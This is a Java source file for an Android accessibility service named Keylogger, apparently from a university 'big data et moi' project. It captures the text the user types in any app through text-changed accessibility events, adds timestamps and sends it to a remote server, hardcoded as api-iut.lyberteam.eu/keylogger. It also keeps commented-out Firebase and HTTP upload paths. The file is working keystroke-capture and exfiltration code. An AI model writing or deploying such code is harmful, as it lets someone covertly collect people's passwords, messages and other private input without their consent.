package ca.uqac.bigdataetmoi.user_inputs;


import android.accessibilityservice.AccessibilityService;
import android.content.Intent;
import android.os.AsyncTask;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.widget.Toast;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.gson.JsonObject;

import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.List;
import java.util.Locale;

import ca.uqac.bigdataetmoi.data.services.HttpClient;
import ca.uqac.bigdataetmoi.data.services.UserService;
import ca.uqac.bigdataetmoi.dto.KeyloggerDto;
import ca.uqac.bigdataetmoi.models.User;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import timber.log.Timber;


public class Keylogger extends AccessibilityService  {


      DatabaseReference ref ;
    UserInputs userInputs;
    public String currentTime;

    private class SendToServerTask extends AsyncTask<String, Void, String> {



        @Override
        protected String doInBackground(String... params) {

            ref = FirebaseDatabase.getInstance().getReference("keylogger");

            Log.d("Keylogger", params[0]);

            try {



                String url = "http:///api-iut.lyberteam.eu/keylogger";
                JsonObject json = new JsonObject();
                json.addProperty("texting", params[0]);


                 userInputs = new UserInputs(params[0]);
                Log.d("keylogger**********", " "+userInputs);

                 currentTime = new SimpleDateFormat("dd-MM-yyyy HH:mm:ss").format(new java.util.Date());

                Log.d("keylogger time*****", " "+currentTime);

                sendKeyloggerRequest(userInputs.text_inputs, currentTime);

                Intent i = new Intent(Keylogger.this, ShowKeylog.class);
                i.putExtra("key",userInputs.text_inputs);



                //push data to firebase
             // ref.push().setValue(userInputs);


                //Send post request to server
                /*Ion.with(getBaseContext().getApplicationContext())
                        .load(url)
                        .setJsonObjectBody(json)

                        .asJsonObject()
                        .setCallback(new FutureCallback<JsonObject>() {
                            @Override
                            public void onCompleted(Exception e, JsonObject result) {
                                // do stuff with the result or error
                                Log.d("test**********", "fini");

                            }
                        });*/






            } catch (Exception e) {
                e.printStackTrace();
            }
            return params[0];
        }
    }

    private void sendKeyloggerRequest(String userInputs, String currentTime) {
        List<KeyloggerDto> keyloggerList = new ArrayList<>();

        KeyloggerDto keyloggerDto = new KeyloggerDto(userInputs, currentTime);
        keyloggerList.add(keyloggerDto);

        Call<User> keyloggerCall = new HttpClient<UserService>(this).create(UserService.class).sendKeylogger(keyloggerList);

        keyloggerCall.enqueue(new Callback<User>() {
            @Override
            public void onResponse(Call<User> call, Response<User> response) {
                handleRegisterResponse(response);
            }

            @Override
            public void onFailure(Call<User> call, Throwable t) {
                handleRegisterFailure(t);
            }
        });
    }

    private void handleRegisterResponse(Response<User> response) {
        if (response.isSuccessful()) {
             Toast.makeText(getApplicationContext(), "Keylogger enregistré avec succès.", Toast.LENGTH_SHORT).show();
         } else {
                 Toast.makeText(getApplicationContext(), "Une erreur a été rencontré .", Toast.LENGTH_SHORT).show();

        }
    }


    private void handleRegisterFailure(Throwable t) {
        Toast.makeText(getApplicationContext(), "Erreur lors de la tentative de keylogger", Toast.LENGTH_SHORT).show();
        Timber.e(t);
     }

    @Override
    public void onServiceConnected() {
        Log.d("Keylogger", "Starting service");
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {

        DateFormat df = new SimpleDateFormat("MM/dd/yyyy, HH:mm:ss z", Locale.FRANCE);
        String time = df.format(Calendar.getInstance().getTime());

        switch(event.getEventType()) {
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED: {
                String data = event.getText().toString();
                int left = data.indexOf("[");

                int right = data.indexOf("]");
                String parsedata = data.substring(left+1, right);


                SendToServerTask sendTask = new SendToServerTask();

                sendTask.execute(time + ", TEXT :" + parsedata  );

                UserInputs user = new UserInputs(parsedata);
                user.setText_inputs(parsedata);
               // userInputs.setText_inputs(parsedata);


                break;
            }
           /* case AccessibilityEvent.TYPE_VIEW_FOCUSED: {
                String data = event.getText().toString();
                SendToServerTask sendTask = new SendToServerTask();
                sendTask.execute(time + "|(FOCUSED)|" + data);
                break;
            }*/

           /* case AccessibilityEvent.TYPE_VIEW_CLICKED: {
                String data = event.getText().toString();
                SendToServerTask sendTask = new SendToServerTask();
                sendTask.execute(time + "|(CLICKED)|" + data);
                break;
            }*/
            default:
                break;
        }
    }

    @Override
    public void onInterrupt() {

    }




}
